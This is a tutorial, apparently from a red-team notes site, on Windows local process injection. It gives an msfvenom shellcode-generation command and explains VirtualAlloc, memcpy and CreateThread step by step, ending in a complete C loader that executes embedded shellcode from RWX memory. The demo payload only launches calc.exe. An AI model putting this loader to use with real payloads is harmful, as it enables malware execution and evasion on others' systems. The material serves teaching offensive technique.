---
description: Local & Remote Process Injection
---

# Process Injection

Process Injection is a technique which involves injecting malicious code or a malicious DLL (Dynamic Link Library) into a legitimate process running on a system. This technique allows an attacker to execute their malicious code within the context of a trusted process, bypassing security measures and **potentially** remaining undetected.

Process injection can be performed on any OS, including Linux, Windows and macOS. Attacks can be broken down into a number of different sub-techniques. The Mitre ATT\&CK framework highlights the following process injection techniques:

* DLL injection
* portable execution injection
* thread execution hijacking
* ptrace system calls
* proc memory
* extra window memory injection
* process hollowing
* process doppelgänging
* virtual dynamic shared object hijacking
* listplanting

### Generating Shellcode

There are different ways to generate a shellcode, but for simplicity purpose, I am going to stick with msfvenom calc payload which can be generated using the command below

```bash
$ msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f C -b "\x00\x0a\x0d"
```

### Local Process Injection

#### 1. Allocating space for our Shellcode

First we need to allocate memory to store our shellcode in our process memory. We can do that with the help of [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function.

```c
/* Function Definition
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
*/
VOID* pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
```

Note: Having an address with all RWX perms can be an IoC, so it’s generally not a great idea to do it. We will see how we can make it better later.

* <mark style="color:purple;">lpAddress</mark> is just starting address of the region to allocate. Since it is optional, we will keep it NULL & let the function decide.
* <mark style="color:purple;">dwSize</mark> is the size of the region to be allocated which we want to be the size of our shellcode.
* We are reserving & commiting the pages(memory) in one step with this, you can read about different options [here](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).
* <mark style="color:purple;">PAGE\_EXECUTE\_READWRITE</mark> is the permission that we are setting on the allocated memory.

#### 2. Writing our Shellcode to the Allocated Memory

With this, we now have allocated Virtual memory in our process space. moving on to the next step, we need to write/copy our payload to the allocated memory. We can do that using [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory), or [memcpy](https://www.geeksforgeeks.org/memcpy-in-cc/).

```c
memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
```

#### 3. Creating Thread to run our Shellcode

Great!, now we have our payload copied at the given address. In order to run the payload, we need to do one last step, which is to create a thread which can run the code, Although we can also do it without the need to create a thread but we will check that out later. We can use [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) to create a thread

```c
/* Function Definition
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
*/
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
```

* <mark style="color:purple;">lpThreadAttributes</mark> is a pointer to a [SECURITY\_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560\(v=vs.85\)) structure. For simplicity purpose, we can just keep it NULL.
* <mark style="color:purple;">dwStackSize</mark> is the size of stack, if 0, the new thread uses default size for the executable.
* <mark style="color:purple;">lpStartAddress</mark> is the pointer to the (starting of the)function to be executed by the thread, which is why this is pShellcodeAddress.
* <mark style="color:purple;">lpParameter</mark> is optional, our “function” doesn’t use any parameter so we keep it NULL.
* <mark style="color:purple;">dwCreationFlags</mark> is a flag determining how we want to create a thread, we can keep it NULL for now.
* <mark style="color:purple;">lpThreadId</mark> is a pointer to a variable which will receive the ThreadId of the newly created thread, this can be NULL since we don’t have any use of it in this case.

#### 4. Letting Thread execute our shellcode

Cool now we have everything right?…., No. There is still one thing left, assuming you did something like this

```c
int main() {
...
VOID* pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
return 0;     // <----- this will exit main just after creating the thread
}             //        so the thread doesn't get time to execute the shell
```

The shellcode won’t run yet, why? because we didn’t let the thread to finish executing the code yet, we exit even before the thread has finished running the code which is why the calculator doesn’t spawn. So we need to wait for the thread to finish before we exit, we can do that by just using getchar / [Sleep](https://www.geeksforgeeks.org/sleep-function-in-c/) (which may not be the best ways) or rather [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject), which will wait until the thread has finished executing only after which we can move to the next code / instruction.

#### 5. Local Process Injection PoC

Here’s a final code to execute shellcode locally.

```c
#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] = 
"....."; // you can have it inside main as well

int main() {
    
    PVOID	pShellcodeAddress;
    HANDLE	hThread;

    pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Shellcode Address is  @---0x%p\n", pShellcodeAddress);
    memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
    hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
    if(hThread == NULL) {
 	printf("Error creating thread  @--0x%d\n", GetLastError());
	return -1;
    }
    printf("Created Thread to run Shellcode \n");
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Executing our code to spawn a calculator</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Checking  the Payload through Process Hacker</p></figcaption></figure>

Nice, We are able to inject the shellcode into local process successfully!. \
If there is any problem, we can add more debug statements to check what is actually happening.&#x20;
